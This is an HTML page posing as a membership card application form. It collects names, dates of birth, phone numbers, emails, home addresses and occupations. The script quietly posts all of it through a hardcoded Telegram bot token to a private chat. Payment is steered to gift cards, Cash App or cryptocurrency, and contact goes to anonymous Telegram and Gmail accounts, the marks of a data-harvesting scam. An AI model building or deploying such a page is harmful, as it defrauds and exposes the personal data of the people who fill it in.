<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Get Membership Card</title>
  <style>
    body {
      background: #121212;
      color: white;
      font-family: 'Segoe UI', sans-serif;
      padding: 10px;
      margin: 0;
    }
    form {
      width: 100%;
      max-width: 700px;
      margin: auto;
      background: #1e1e1e;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 30px rgba(0, 0, 0, 0.8);
      box-sizing: border-box;
    }
    h2 {
      text-align: center;
      color: gold;
      font-size: 2em;
      font-family: 'Georgia', serif;
      margin-bottom: 20px;
    }
    input, select {
      width: 100%;
      padding: 12px;
      margin: 12px 0;
      border: none;
      border-radius: 8px;
      background: #333;
      color: white;
      font-size: 1em;
      box-sizing: border-box;
    }
    .submit-btn {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #FFD700, #FF8C00);
      color: black;
      font-size: 1.2em;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }
    .submit-btn:hover {
      transform: scale(1.05);
      box-shadow: 0 0 25px rgba(255, 140, 0, 0.7);
    }
    #contactOptions {
      display: none;
      margin-top: 20px;
      text-align: center;
      background: #333;
      padding: 20px;
      border-radius: 8px;
    }
    .contact-icon {
      width: 60px;
      margin: 10px;
      cursor: pointer;
      transition: transform 0.3s ease;
    }
    .contact-icon:hover {
      transform: scale(1.1);
    }
  </style>
</head>
<body>

  <form id="membershipForm">
    <h2>Membership Application Form</h2>
    <input type="text" id="name" placeholder="Full Name" required>
    <input type="date" id="dob" placeholder="Date of Birth" required>
    <select id="gender" required>
      <option value="">Select Gender</option>
      <option>Male</option>
      <option>Female</option>
    </select>
    <input type="tel" id="phone" placeholder="Phone Number" required>
    <input type="email" id="email" placeholder="Email Address" required>
    <input type="text" id="address" placeholder="Home Address" required>
    <input type="text" id="occupation" placeholder="Occupation" required>
    <input type="text" id="country" placeholder="Country" required>
    <select id="card" required>
      <option value="">Select Membership Card</option>
      <option>Gold</option>
      <option>Silver</option>
      <option>Platinum</option>
      <option>Diamond</option>
    </select>
    <select id="payment" required>
      <option value="">Payment Method</option>
      <option>PayPal</option>
      <option>Cash App</option>
      <option>Gift Card</option>
      <option>Cryptocurrency</option>
    </select>
    <input type="date" id="applicationDate" required placeholder="Date of Application">
    <button type="button" class="submit-btn" onclick="submitForm()">Apply Now</button>

    <div id="contactOptions">
      <p style="color: gold;">Choose how to contact the management:</p>
      <a href="https://t.me/Official_private03" target="_blank">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="contact-icon" alt="Telegram">
      </a>
      <a href="mailto:Officialmanagement4296@gmail.com?subject=Membership%20Application" target="_blank">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Mail_%28iOS%29.svg" class="contact-icon" alt="Email">
      </a>
    </div>
  </form>

  <script>
    function submitForm() {
      const botToken = "8151429137:AAEZb095wNIkxujeKqXIzXWHycNaIOB15_0";
      const chatId = "7399779883";

      const name = document.getElementById('name').value;
      const dob = document.getElementById('dob').value;
      const gender = document.getElementById('gender').value;
      const phone = document.getElementById('phone').value;
      const email = document.getElementById('email').value;
      const address = document.getElementById('address').value;
      const occupation = document.getElementById('occupation').value;
      const country = document.getElementById('country').value;
      const card = document.getElementById('card').value;
      const payment = document.getElementById('payment').value;
      const applicationDate = document.getElementById('applicationDate').value;

      const message = `
New Membership Application:
Full Name: ${name}
Date of Birth: ${dob}
Gender: ${gender}
Phone Number: ${phone}
Email: ${email}
Home Address: ${address}
Occupation: ${occupation}
Country: ${country}
Membership Card: ${card}
Payment Method: ${payment}
Date of Application: ${applicationDate}
      `;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          document.getElementById('contactOptions').style.display = 'block';
          alert("Form submitted successfully!");
        } else {
          alert("Failed to send the form. Try again.");
        }
      })
      .catch(error => {
        alert("Error sending form: " + error);
      });
    }
  </script>

</body>
</html>
